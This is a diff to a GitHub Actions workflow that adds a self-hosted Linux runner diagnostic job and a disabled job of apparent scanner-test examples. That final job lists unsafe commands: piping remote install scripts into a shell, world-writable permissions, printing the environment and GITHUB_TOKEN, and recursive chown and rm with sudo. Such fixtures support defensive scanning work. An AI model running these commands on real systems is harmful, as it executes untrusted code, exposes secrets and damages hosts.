@@ -11,13 +11,109 @@ on:
 
 jobs:
   test:
-    runs-on: self-hosted
+    name: Verify Linux self-hosted runner
+    runs-on: [self-hosted, Linux, X64]
+    timeout-minutes: 10
+    env:
+      EXPECTED_RUNNER_OS: Linux
+      EXPECTED_RUNNER_ARCH: X64
+
     steps:
-      - name: Print runner info
+      - name: Run Linux runner diagnostics
+        shell: bash
         run: |
-          echo "Hello from self-hosted runner"
-          echo "Event: $GITHUB_EVENT_NAME"
-          echo "Ref: $GITHUB_REF"
-          echo "SHA: $GITHUB_SHA"
-          uname -a
-          pwd
+          set -Eeuo pipefail
+
+          fail() {
+            printf 'ERROR: %s\n' "$*" >&2
+            exit 1
+          }
+
+          require_environment_variable() {
+            local name="$1"
+
+            if [[ -z "${!name:-}" ]]; then
+              fail "Required environment variable ${name} is not set."
+            fi
+          }
+
+          assert_equal() {
+            local description="$1"
+            local expected="$2"
+            local actual="$3"
+
+            if [[ "$actual" != "$expected" ]]; then
+              fail "${description}: expected '${expected}', got '${actual}'."
+            fi
+          }
+
+          for name in \
+            RUNNER_NAME \
+            RUNNER_OS \
+            RUNNER_ARCH \
+            GITHUB_EVENT_NAME \
+            GITHUB_REF \
+            GITHUB_SHA; do
+            require_environment_variable "$name"
+          done
+
+          assert_equal "Runner operating system" "$EXPECTED_RUNNER_OS" "$RUNNER_OS"
+          assert_equal "Runner architecture" "$EXPECTED_RUNNER_ARCH" "$RUNNER_ARCH"
+          assert_equal "Kernel name" "Linux" "$(uname -s)"
+
+          case "$GITHUB_EVENT_NAME" in
+            pull_request | push | workflow_dispatch) ;;
+            *) fail "Unsupported GitHub event '${GITHUB_EVENT_NAME}'." ;;
+          esac
+
+          printf 'Linux self-hosted runner verification passed.\n'
+          printf 'Runner name: %s\n' "$RUNNER_NAME"
+          printf 'Runner OS: %s\n' "$RUNNER_OS"
+          printf 'Runner architecture: %s\n' "$RUNNER_ARCH"
+          printf 'Event: %s\n' "$GITHUB_EVENT_NAME"
+          printf 'Ref: %s\n' "$GITHUB_REF"
+          printf 'SHA: %s\n' "$GITHUB_SHA"
+          printf 'Kernel: %s\n' "$(uname -a)"
+          printf 'Bash: %s\n' "$BASH_VERSION"
+
+          if command -v getconf >/dev/null 2>&1; then
+            printf 'CPU count: %s\n' "$(getconf _NPROCESSORS_ONLN)"
+          else
+            printf 'CPU count: unavailable (getconf is not installed)\n'
+          fi
+
+          if command -v df >/dev/null 2>&1; then
+            printf 'Disk usage:\n'
+            df -h .
+          else
+            printf 'Disk usage: unavailable (df is not installed)\n'
+          fi
+
+          if [[ -n "${GITHUB_STEP_SUMMARY:-}" ]]; then
+            {
+              printf '## Linux self-hosted runner verification\n\n'
+              printf '| Field | Value |\n'
+              printf '| --- | --- |\n'
+              printf '| Runner | `%s` |\n' "$RUNNER_NAME"
+              printf '| OS | `%s` |\n' "$RUNNER_OS"
+              printf '| Architecture | `%s` |\n' "$RUNNER_ARCH"
+              printf '| Event | `%s` |\n' "$GITHUB_EVENT_NAME"
+              printf '| Ref | `%s` |\n' "$GITHUB_REF"
+              printf '| SHA | `%s` |\n' "$GITHUB_SHA"
+            } >>"$GITHUB_STEP_SUMMARY"
+          fi
+
+  insecure-command-scan-test:
+    runs-on: self-hosted
+    if: ${{ false }}
+
+    steps:
+      - name: Unsafe command examples for scanner test
+        run: |
+          curl -fsSL https://example.com/install.sh | bash
+          wget -qO- https://example.com/install.sh | sh
+          chmod -R 777 .
+          printenv
+          echo "$GITHUB_TOKEN"
+          sudo chown -R runner:runner /
+          sudo rm -rf /tmp/scanner-test-directory
